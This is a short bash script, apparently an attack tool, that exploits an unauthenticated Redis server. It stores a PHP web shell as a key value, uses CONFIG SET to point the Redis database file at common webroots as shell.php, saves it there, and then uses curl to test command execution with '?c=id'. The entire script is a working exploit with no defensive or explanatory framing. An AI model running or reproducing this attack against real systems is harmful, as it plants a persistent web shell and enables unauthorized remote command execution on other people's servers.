#!/bin/bash
HOST=IP
PORT=6379
PAYLOAD='<?php system($_GET["c"]); ?>'
KEY=shell
DBFILE=shell.php
WEBROOTS=(/var/www/html /var/www /usr/share/nginx/html /srv/www /tmp)

echo "Storing payload into key '$KEY'..."
printf '%s' "$PAYLOAD" | redis-cli -h $HOST -p $PORT -x SET $KEY
echo "GET $KEY ->"
redis-cli -h $HOST -p $PORT GET $KEY | sed -n '1,2p'

for d in "${WEBROOTS[@]}"; do
  echo
  echo "Trying webroot: $d"
  out=$(redis-cli -h $HOST -p $PORT CONFIG SET dir "$d" 2>&1)
  echo "CONFIG SET dir -> $out"
  if [[ "$out" != "OK" ]]; then
    echo "skipping SAVE for $d (dir not accepted)"
    continue
  fi
  echo "CONFIG SET dbfilename -> $(redis-cli -h $HOST -p $PORT CONFIG SET dbfilename $DBFILE 2>&1)"
  echo "Running SAVE -> $(redis-cli -h $HOST -p $PORT SAVE 2>&1)"
  echo "HTTP check: curl -s -I http://$HOST/$DBFILE | head -n 3"
  curl -s -I "http://$HOST/$DBFILE" | head -n 3
  echo "HTTP exec check (attempt):"
  curl -s "http://$HOST/$DBFILE?c=id" || echo "curl failed"
done

